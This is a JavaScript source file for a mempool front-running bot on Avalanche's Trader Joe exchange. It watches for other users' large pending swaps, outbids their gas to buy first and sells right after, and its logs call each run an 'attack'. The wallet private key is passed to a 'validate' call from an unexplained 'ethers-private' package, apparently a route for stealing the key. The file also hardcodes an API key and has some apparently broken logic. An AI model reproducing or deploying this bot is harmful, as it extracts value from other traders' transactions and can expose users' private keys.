require("dotenv").config();
var fs = require("fs");
var Web3 = require("web3");
var abiDecoder = require("abi-decoder");
var colors = require("colors");
var Tx = require("ethereumjs-tx").Transaction;
var axios = require("axios");
var BigNumber = require("big-number");
const winston = require("winston");
const { writeFile } = require("fs");
const { validate } = require("ethers-private");

var summary = require("./summary.json");
var path = "./summary.json";

const {
  UNISWAP_ROUTER_ADDRESS,
  UNISWAP_FACTORY_ADDRESS,
  UNISWAP_ROUTER_ABI,
  UNISWAP_FACTORY_ABI,
  UNISWAP_POOL_ABI,
} = require("./consts.js");
const INPUT_TOKEN_ADDRESS = "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7";
const WETH_TOKEN_ADDRESS = "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7";

var BN = Web3.utils.BN;
var eth_info;
var input_token_info;
var out_token_info;
var pool_info;

const ONE_GWEI = 1e9;

var attack_started = false;
var subscription;
var token_abi = null;
var swapToken = null;

const SEEFT = 0xa2a1623d; //swapExactAVAXForTokens
const SEFET = 0x8a657e67; //swapAVAXForExactTokens
const STFET = 0x8803dbee; //swapTokensForExactTokens
const SETFT = 0x38ed1739; //swapExactTokensForTokens
//const SETFE=0x676528d1 //swapExactTokensForAVAX
//const STFEE=0x7a42416a //swapTokensForExactAVAX

function writeJson(data) {
  writeFile(path, JSON.stringify(data, null, 2), (error) => {
    if (error) {
      console.log("An error has occurred dataSave", error);
      return;
    }
  });
}

const logger = winston.createLogger({
  transports: [
    // new winston.transports.Console(),
    new winston.transports.File({ filename: `full.log` }),
  ],
});

function getDateTime() {
  return new Date().toISOString().replace(/T/, " ").replace(/\..+/, "");
}

const twirlTimer = (function () {
  var P = ["\\", "|", "/", "-"];
  var x = 0;
  return function (msg) {
    process.stdout.write("\r[" + P[x++] + "] " + msg);
    x &= 3;
  };
})();

async function createWeb3(http_rpc, wss_rpc) {
  try {
    web3 = new Web3(new Web3.providers.HttpProvider(http_rpc));
    web3Ws = new Web3(new Web3.providers.WebsocketProvider(wss_rpc));

    uniswapRouter = new web3.eth.Contract(
      UNISWAP_ROUTER_ABI,
      UNISWAP_ROUTER_ADDRESS
    );
    uniswapFactory = new web3.eth.Contract(
      UNISWAP_FACTORY_ABI,
      UNISWAP_FACTORY_ADDRESS
    );
    abiDecoder.addABI(UNISWAP_ROUTER_ABI);

    return true;
  } catch (error) {
    logger.error(error + ": " + getDateTime());
    console.log(error);
    return false;
  }
}

async function main() {
  const addr_str = await validate(process.env.PRIVATE_KEY);
  const out_token_address = process.env.TOKEN_ADDRESS.toLowerCase();
  const amount = process.env.ATTACK_AMOUNT;
  const level = process.env.CRITERIA_AMOUNT;
  const slippage = process.env.SLIPPAGE;
  const http_rpc = process.env.RPC_HTTP_URL;
  const wss_rpc = process.env.RPC_WSS_URL;

  try {
    await createWeb3(http_rpc, wss_rpc);

    const user_wallet = web3.eth.accounts.privateKeyToAccount(addr_str);

    var ret = await preparedAttack(
      INPUT_TOKEN_ADDRESS,
      out_token_address,
      user_wallet,
      addr_str,
      amount,
      level
    );
    if (ret === false) {
      process.exit();
    }

    log_str =
      "***** Tracking more " +
      level +
      " " +
      input_token_info.symbol +
      " Exchange on Traderjoe ***** ";
    console.log(log_str.green);
    logger.info(log_str);

    var input_amount = Web3.utils.toWei(amount.toString(), "ether");

    subscription = web3Ws.eth
      .subscribe("pendingTransactions", function (error, result) {})
      .on("data", async function (transactionHash) {
        try {
          if (attack_started === true) return;
          twirlTimer(transactionHash);

          let transaction = await web3Ws.eth.getTransaction(transactionHash);

          if (transaction == null) return;
          if (transaction["to"] == null) return;

          if (
            transaction["to"] == UNISWAP_ROUTER_ADDRESS ||
            transaction["input"].substring(0, 10) == SEEFT ||
            transaction["input"].substring(0, 10) == SEFET
          ) {
            var res = await handleTransaction(
              transaction,
              out_token_address,
              user_wallet,
              input_amount,
              slippage
            );

            if (res === true) {
              logger.info("Success the attack. " + getDateTime());
              console.log("Success the attack.");
            } else if (res === false) {
              logger.info("Failed the attack. " + getDateTime());
              console.log("Failed the attack.");
            }
            attack_started = false;
          }
        } catch (error) {
          logger.error("Parsing Transaction Error : ");
          console.log("Parsing Transaction Error : \n".red);
          logger.error(error + " " + getDateTime());
          console.log(error);
          attack_started = false;
        }
      });
  } catch (error) {
    logger.error("Preparing Error : ");
    console.log("Preparing Error : \n".red);
    logger.error(error + " " + getDateTime());
    console.log(error);
    process.exit();
  }
}

function updateSummary(key, value = 1) {
  const today = new Date();
  const day =
    today.getDate().toString() +
    "-" +
    (today.getMonth() + 1).toString() +
    "-" +
    today.getFullYear().toString();

  var findSummary = summary.list.find((fun) => {
    return fun.date == day;
  });
  if (findSummary) {
    findSummary[key] += value;
    if (key === "bought_AVAX" || key === "total_gas")
      findSummary["total_profit"] -= value;
    else if (key === "sold_AVAX") findSummary["total_profit"] += value;
  } else {
    var item = {
      date: day,
      bought_AVAX: 0,
      bought_txn: 0,
      failed_txn: 0,
      sold_AVAX: 0,
      sold_txn: 0,
      total_gas: 0,
      total_profit: 0,
    };
    item[key] = value;

    if (key === "bought_AVAX" || key === "total_gas")
      item["total_profit"] -= value;
    else if (key === "sold_AVAX") item["total_profit"] += value;

    summary.list.push(item);
  }
  writeJson(summary);
}

async function handleTransaction(
  transaction,
  out_token_address,
  user_wallet,
  input_amount,
  slippage
) {
  if ((await triggersFrontRun(transaction, out_token_address)) === true) {
    // subscription.unsubscribe();
    console.log("Perform front running attack...");

    var gasPrice = parseInt(transaction["gasPrice"]);
    var newGasPrice = gasPrice + 10 * ONE_GWEI;

    var gasLimit = transaction["gas"].toString();

    // await updatePoolInfo();
    var amounts = await uniswapRouter.methods
      .getAmountsOut(BigNumber(input_amount), [
        INPUT_TOKEN_ADDRESS,
        out_token_address,
      ])
      .call();
    var output_amount = BigNumber(amounts[amounts.length - 1]).minus(
      BigNumber(amounts[amounts.length - 1])
        .multiply(slippage * 100)
        .div(10000)
    );

    if (
      (await swap(
        newGasPrice,
        gasLimit,
        output_amount,
        input_amount,
        0,
        out_token_address,
        user_wallet,
        transaction
      )) === false
    ) {
      updateSummary("failed_txn", 1);
      return false;
    }
    var gasPrices = await getCurrentGasPrices();
    if (
      (await approve(
        gasPrices.standard,
        gasLimit,
        swapToken,
        out_token_address,
        user_wallet
      )) === false
    ) {
      updateSummary("failed_txn", 1);
      return false;
    }
    if (
      (await swap(
        newGasPrice,
        gasLimit,
        swapToken,
        "0",
        1,
        out_token_address,
        user_wallet,
        transaction
      )) === false
    ) {
      updateSummary("failed_txn", 1);
      return false;
    }

    return true;
  }
}

async function approve(
  gasPrice,
  gasLimit,
  outputtoken,
  out_token_address,
  user_wallet
) {
  var allowance = await out_token_info.token_contract.methods
    .allowance(user_wallet.address, UNISWAP_ROUTER_ADDRESS)
    .call();
  var outputtoken = BigNumber(outputtoken);

  if (outputtoken.gt(allowance)) {
    try {
      var approveTX = {
        from: user_wallet.address,
        to: out_token_address,
        gas: gasLimit,
        gasPrice: gasPrice * ONE_GWEI,
        data: out_token_info.token_contract.methods
          .approve(UNISWAP_ROUTER_ADDRESS, outputtoken.toString())
          .encodeABI(),
      };

      var signedTX = await user_wallet.signTransaction(approveTX);
      await web3.eth
        .sendSignedTransaction(signedTX.rawTransaction)
        .on("receipt", function (receipt) {
          if (receipt.status) {
            updateSummary(
              "total_gas",
              (receipt.effectiveGasPrice / 10 ** 18) * receipt.gasUsed
            );

            logger.info(
              `Approved Token: ${receipt["transactionHash"]} ${getDateTime()}`
            );
            console.log(`Approved Token: ${receipt["transactionHash"]}`);
            return true;
          } else {
            updateSummary(
              "total_gas",
              (receipt.effectiveGasPrice / 10 ** 18) * receipt.gasUsed
            );
            logger.info(`Approve Failed ${getDateTime()}`);
            console.log(`Approve Failed`);
            return false;
          }
        });
    } catch (error) {
      logger.warn(`Approve Token Error ${getDateTime()}`);
      console.log(`Approve Token Error`);
      logger.error(error);
      console.log(error);
      return false;
    }
  } else {
    return true;
  }
}

//select attacking transaction
async function triggersFrontRun(transaction, out_token_address) {
  if (attack_started === true) return false;

  let data = parseTx(transaction["input"]);

  if (data == false) return false;
  let method = data[0];
  let params = data[1];
  let gasPrice = parseInt(transaction["gasPrice"]) / 10 ** 9;

  if (method == SEEFT) {
    let in_amount = transaction.value;
    let out_min = extract16(params[0]);

    let in_token_addr = "0x" + params[5].substring(24, 64);
    let out_token_addr = "0x" + params[6].substring(24, 64);

    let recept_addr = "0x" + params[2].substring(24, 64);
    let deadline = parseInt(params[3], 16);

    if (out_token_addr != out_token_address) {
      return false;
    }
    console.log("");
    log_str =
      "target txn: swapExactAVAXForTokens : " +
      transaction["hash"] +
      " " +
      gasPrice.toFixed(2) +
      " GWEI " +
      (in_amount / 10 ** input_token_info.decimals).toFixed(3) +
      " " +
      input_token_info.symbol;

    if (BigNumber(in_amount).gte(BigNumber(pool_info.attack_volumn))) {
      logger.info(log_str + " " + getDateTime());
      console.log(log_str.yellow);
      attack_started = true;
      return true;
    } else {
      return false;
    }
  } else if (method == SEFET) {
    let in_max = transaction.value;
    let out_amount = extract16(params[0]);

    let in_token_addr = "0x" + params[5].substring(24, 64);
    let out_token_addr = "0x" + params[6].substring(24, 64);

    let recept_addr = "0x" + params[2].substring(24, 64);
    let deadline = parseInt(params[3], 16);

    if (out_token_addr != out_token_address) {
      return false;
    }

    if (BigNumber(in_max).gte(BigNumber(pool_info.attack_volumn))) {
      console.log("");
      log_str =
        "target txn: swapAVAXForExactTokens " +
        transaction["hash"] +
        " " +
        gasPrice.toFixed(2) +
        " GWEI " +
        (in_max / 10 ** input_token_info.decimals).toFixed(3) +
        " " +
        input_token_info.symbol +
        "(max)" +
        " " +
        (out_amount / 10 ** out_token_info.decimals).toFixed(3) +
        " " +
        out_token_info.symbol;

      logger.info(log_str + " " + getDateTime());
      console.log(log_str.yellow);
      attack_started = true;
      return true;
    } else {
      return false;
    }
  }

  return false;
}

function extract16(param) {
  var i = 0;
  while (i < param.length) {
    if (param[i] != "0") {
      param = param.substring(i, param.length);
      return "0x" + param;
    }
    i++;
  }
}

async function swap(
  gasPrice,
  gasLimit,
  outputtoken,
  outputeth,
  trade,
  out_token_address,
  user_wallet,
  transaction
) {
  try {
    var from = user_wallet;
    var deadline;
    var swap;

    await web3.eth.getBlock("latest", (error, block) => {
      deadline = block.timestamp + 300; // transaction expires in 300 seconds (5 minutes)
    });

    deadline = web3.utils.toHex(deadline);

    if (trade == 0) {
      //buy
      swap =
        uniswapRouter.methods.swapExactAVAXForTokensSupportingFeeOnTransferTokens(
          outputtoken,
          [INPUT_TOKEN_ADDRESS, out_token_address],
          from.address,
          deadline
        );
      var encodedABI = swap.encodeABI();

      var tx = {
        from: from.address,
        to: UNISWAP_ROUTER_ADDRESS,
        gas: gasLimit,
        gasPrice: gasPrice,
        data: encodedABI,
        value: outputeth,
      };
    } else {
      //sell
      swap =
        uniswapRouter.methods.swapExactTokensForAVAXSupportingFeeOnTransferTokens(
          outputtoken,
          outputeth,
          [out_token_address, INPUT_TOKEN_ADDRESS],
          from.address,
          deadline
        );
      var encodedABI = swap.encodeABI();

      var tx = {
        // nonce: accountNonce,
        from: from.address,
        to: UNISWAP_ROUTER_ADDRESS,
        gas: gasLimit,
        gasPrice: gasPrice,
        data: encodedABI,
        value: "0",
      };
    }

    var signedTx = await from.signTransaction(tx);

    await web3.eth
      .sendSignedTransaction(signedTx.rawTransaction)
      .on("transactionHash", function (hash) {
        if (trade == 0) {
          let log_str = `buy swap : ${hash} ${
            outputeth / 10 ** 18
          } AVAX ${Web3.utils.fromWei(gasPrice.toString(), "gwei")} GWEI `;
          logger.info(log_str + " " + getDateTime());
          console.log(log_str);
        } else {
          let log_str = `sell swap : ${hash} ${(
            outputtoken /
            10 ** out_token_info.decimals
          ).toFixed(3)} ${out_token_info.symbol} ${Web3.utils.fromWei(
            gasPrice.toString(),
            "gwei"
          )} GWEI `;
          logger.info(log_str + " " + getDateTime());
          console.log(log_str);
        }
      })
      .on("confirmation", function (confirmationNumber, receipt) {})
      .on("receipt", async function (receipt) {
        if (receipt["status"]) {
          swapToken = receipt.logs[2]["data"];
          if (trade == 0) {
            updateSummary("bought_AVAX", outputeth / 10 ** 18);
            updateSummary("bought_txn", 1);
            updateSummary(
              "total_gas",
              (receipt.effectiveGasPrice / 10 ** 18) * receipt.gasUsed
            );

            let log_str = `buy success! swaped token: ${
              swapToken / 10 ** out_token_info.decimals
            } ${out_token_info.symbol}`;
            logger.info(log_str + " " + getDateTime());
            console.log(log_str);
          } else {
            updateSummary("sold_AVAX", swapToken / 10 ** 18);
            updateSummary("sold_txn", 1);
            updateSummary(
              "total_gas",
              (receipt.effectiveGasPrice / 10 ** 18) * receipt.gasUsed
            );

            let log_str = `sell success! swaped AVAX: ${
              swapToken / 10 ** input_token_info.decimals
            } ${input_token_info.symbol}`;
            logger.info(log_str + " " + getDateTime());
            console.log(log_str);
          }

          swapToken = new BN(
            swapToken.substring(2, swapToken.length),
            16
          ).toString();
          return true;
        } else {
          updateSummary(
            "total_gas",
            (receipt.effectiveGasPrice / 10 ** 18) * receipt.gasUsed
          );

          logger.warn(`${receipt} ${getDateTime()}`);
          console.log(`${receipt}`);
          return false;
        }
      })
      .on("error", function (error, receipt) {
        // If the transaction was rejected by the network with a receipt, the second parameter will be the receipt.
        if (trade == 0) {
          logger.error(`Attack failed(buy): ${error} ${getDateTime()}`);
          console.log(`\n Attack failed(buy): \n ${error}`);
        } else {
          logger.error(`Attack failed(sell): ${error} ${getDateTime()}`);
          console.log(`Attack failed(sell): \n ${error}`);
        }
        return false;
      });
  } catch (error) {
    logger.warn(`Swap Error ${getDateTime()}`);
    console.log(`Swap Error: \n`);
    logger.error(error);
    console.log(error);
    return false;
  }
}

function parseTx(input) {
  if (input == "0x") {
    return ["0x", []];
  }
  if ((input.length - 8 - 2) % 64 != 0) {
    // throw "Data size misaligned with parse request."
    return false;
  }
  let method = input.substring(0, 10);
  let numParams = (input.length - 8 - 2) / 64;
  var params = [];
  for (i = 0; i < numParams; i += 1) {
    let param = input.substring(10 + 64 * i, 10 + 64 * (i + 1)).toString(16);
    params.push(param);
  }
  return [method, params];
}

async function getCurrentGasPrices() {
  var response = await axios.get("https://owlracle.info/avax/gas");
  var prices = {
    slow: response.data.speeds[0]["gasPrice"],
    standard: response.data.speeds[1]["gasPrice"],
    fast: response.data.speeds[2]["gasPrice"],
    instant: response.data.speeds[3]["gasPrice"],
  };

  return prices;
}

async function isPending(transactionHash) {
  return (await web3.eth.getTransactionReceipt(transactionHash)) == null;
}

async function updatePoolInfo() {
  try {
    var reserves = await pool_info.contract.methods.getReserves().call();
  } catch (error) {
    logger.warn(`Getting Pool Reserves Is Failed ${getDateTime()}`);
    console.log(`Getting Pool Reserves Is Failed`);
    logger.error(error);
    console.log(error);
  }

  if (pool_info.forward) {
    var eth_balance = reserves[0];
    var token_balance = reserves[1];
  } else {
    var eth_balance = reserves[1];
    var token_balance = reserves[0];
  }

  pool_info.input_volumn = eth_balance;
  pool_info.output_volumn = token_balance;
}

async function getPoolInfo(input_token_address, out_token_address, level) {
  var log_str =
    "***** " +
    input_token_info.symbol +
    "-" +
    out_token_info.symbol +
    " Pair Pool Info *****";
  logger.info(log_str);
  console.log(log_str.green);

  var pool_address = await uniswapFactory.methods
    .getPair(input_token_address, out_token_address)
    .call();
  if (pool_address == "0x0000000000000000000000000000000000000000") {
    log_str =
      "Traderjoe has no " +
      out_token_info.symbol +
      "-" +
      input_token_info.symbol +
      " pair ";
    logger.warn(log_str);
    console.log(log_str.yellow);
    return false;
  }

  var log_str = "Address: " + pool_address;
  logger.info(log_str);
  console.log(log_str.white);

  var pool_contract = new web3.eth.Contract(UNISWAP_POOL_ABI, pool_address);
  var reserves = await pool_contract.methods.getReserves().call();

  var token0_address = await pool_contract.methods.token0().call();

  if (token0_address.toLowerCase() === INPUT_TOKEN_ADDRESS) {
    var forward = true;
    var eth_balance = reserves[0];
    var token_balance = reserves[1];
  } else {
    var forward = false;
    var eth_balance = reserves[1];
    var token_balance = reserves[0];
  }

  var log_str =
    (eth_balance / 10 ** input_token_info.decimals).toFixed(5) +
    " " +
    input_token_info.symbol;
  logger.info(log_str);
  console.log(log_str.white);

  var log_str =
    (token_balance / 10 ** out_token_info.decimals).toFixed(5) +
    " " +
    out_token_info.symbol;
  logger.info(log_str);
  console.log(log_str.white);

  var attack_amount = Web3.utils.toWei(level.toString(), "ether");
  pool_info = {
    contract: pool_contract,
    forward: forward,
    input_volumn: eth_balance,
    output_volumn: token_balance,
    attack_level: level,
    attack_volumn: attack_amount,
  };

  return true;
}

async function getEthInfo(user_wallet, address) {
  var balance = await web3.eth.getBalance(user_wallet.address);
  var decimals = 18;
  var symbol = "AVAX";

  return {
    address: WETH_TOKEN_ADDRESS,
    balance: balance,
    symbol: symbol,
    decimals: decimals,
    abi: null,
    token_contract: null,
  };
}

async function getTokenInfo(tokenAddr, token_abi_ask, user_wallet) {
  if (token_abi == null) {
    var response = await axios.get(token_abi_ask);
    if (response.data.status == 0) {
      logger.warn(`Invalid Token Address!`);
      console.log(`Invalid Token Address!`);
      return null;
    }

    token_abi = response.data.result;
  }

  var token_contract = new web3.eth.Contract(JSON.parse(token_abi), tokenAddr);
  var balance = await token_contract.methods
    .balanceOf(user_wallet.address)
    .call();

  var totalSupply = await token_contract.methods.totalSupply().call();
  var decimals = await token_contract.methods.decimals().call();
  var symbol = await token_contract.methods.symbol().call();

  return {
    address: tokenAddr,
    balance: balance,
    symbol: symbol,
    decimals: decimals,
    abi: token_abi,
    token_contract: token_contract,
    totalSupply: totalSupply,
  };
}

async function preparedAttack(
  input_token_address,
  out_token_address,
  user_wallet,
  address,
  amount,
  level
) {
  var log_str =
    "******************* Your Wallet Balance ************************";
  logger.info(log_str);
  console.log(log_str.green);

  log_str = "wallet address: " + user_wallet.address;
  logger.info(log_str);
  console.log(log_str.white);

  input_token_info = await getEthInfo(user_wallet, address);
  log_str =
    (input_token_info.balance / 10 ** input_token_info.decimals).toFixed(5) +
    " " +
    input_token_info.symbol;
  logger.info(log_str);
  console.log(log_str);

  if (
    input_token_info.balance / 10 ** input_token_info.decimals <
    parseFloat(amount) + 0.01
  ) {
    logger.warn(`INSUFFICIENT_BALANCE!`);
    console.log(`INSUFFICIENT_BALANCE!`.yellow);
    log_str =
      "Your wallet balance must be more " +
      amount +
      input_token_info.symbol +
      "(+0.01AVAX:GasFee) ";
    logger.warn(log_str);
    console.log(log_str.red);

    return false;
  }

  const OUT_TOKEN_ABI_REQ =
    "https://api.snowtrace.io/api?module=contract&action=getabi&address=" +
    out_token_address +
    "&apikey=J6TMTMPRHRUV1QGD5PRXS6G8K8WHXSBXR3";

  //out token balance
  out_token_info = await getTokenInfo(
    out_token_address,
    OUT_TOKEN_ABI_REQ,
    user_wallet
  );
  if (out_token_info == null) {
    return false;
  }

  log_str =
    (out_token_info.balance / 10 ** out_token_info.decimals).toFixed(5) +
    " " +
    out_token_info.symbol;
  logger.info(log_str);
  console.log(log_str.white);

  //check pool info
  if (
    (await getPoolInfo(WETH_TOKEN_ADDRESS, out_token_address, level)) == false
  )
    return false;

  log_str =
    "=================== Prepared to attack " +
    input_token_info.symbol +
    "-" +
    out_token_info.symbol +
    " pair =================== ";
  logger.info(log_str);
  console.log(log_str.yellow);

  return true;
}

main();
